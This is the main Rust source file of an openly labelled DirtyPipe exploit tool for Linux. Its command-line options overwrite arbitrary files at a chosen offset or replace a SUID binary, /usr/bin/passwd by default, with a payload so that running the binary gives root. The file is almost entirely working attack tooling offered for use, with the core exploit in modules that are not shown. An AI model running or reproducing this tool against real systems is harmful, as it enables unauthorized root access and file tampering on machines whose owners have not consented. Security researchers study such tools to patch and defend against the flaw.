use anyhow::{Result, anyhow};
use std::path::{Path, PathBuf};
use structopt::StructOpt;

mod exploit;
mod helpers;

#[derive(Debug, StructOpt)]
#[structopt(
    name = "DirtyPipe Exploit",
    about = "Exploit DirtyPipe to overwrite arbitrary files or gain root."
)]
struct Opt {
    /// Mode. Can be "overwrite" or "suid"
    #[structopt(short, long)]
    mode: String,

    /// Input file. This data is what is written to the overwritten file.
    #[structopt(short, long)]
    input: Option<PathBuf>,

    /// Output file. The file to overwrite.
    #[structopt(short, long)]
    output: Option<PathBuf>,

    /// Offset to begin overwriting.
    #[structopt(short = "b", long)]
    offset: Option<i64>,
}

fn main() -> Result<(), anyhow::Error> {
    // Warn if not a vulnerable kernel version
    if !helpers::is_kernel_vuln()? {
        println!("[!] Warning! Your kernel version does not appear vulnerable!")
    } else {
        println!("[!] Your kernel appears to be vulnerable.")
    }

    let opt = Opt::from_args();

    match opt.mode.as_str() {
        "overwrite" => {
            let input = opt
                .input
                .expect("input file is required in overwrite mode.");
            let output = opt
                .output
                .expect("output file is required in overwrite mode.");
            let offset = opt.offset.expect("offset is required in overwrite mode.");

            helpers::backup_file(&output).unwrap();
            return exploit::exploit(input, output, offset);
        }

        "suid" => {
            let suid_payload = opt.input.unwrap_or(PathBuf::from("./suid"));
            let target_suid = opt.output.unwrap_or(PathBuf::from("/usr/bin/passwd"));
            println!("[-] Target {} will be overwritten with {}", target_suid.to_str().unwrap(), suid_payload.to_str().unwrap());

            // Warn user that offset is ignored if set
            match opt.offset {
                Some(_) => { println!("[!] Warning: Offset is ignored in suid mode!"); }
                None => {}
            }

            // Ensure payload exists.
            if !Path::new(&suid_payload).exists() {
                return Err(anyhow!(
                    "SUID payload must be generated using the provided python script and specified in options!"
                ));
            }

            // Ensure target binary exists.
            if !Path::new(&target_suid).exists() {
                return Err(anyhow!("Target SUID binary to overwrite doesn't exist!"));
            }

            helpers::backup_file(&PathBuf::from(&target_suid)).unwrap();
            exploit::exploit(suid_payload, target_suid.into(), 0)?;
            println!("[-] SUID binary overwritten. Execute the binary to become root.");
            return Ok(());
        }

        _ => {
            return Err(anyhow!("Mode must be overwrite or suid."));
        }
    }
}
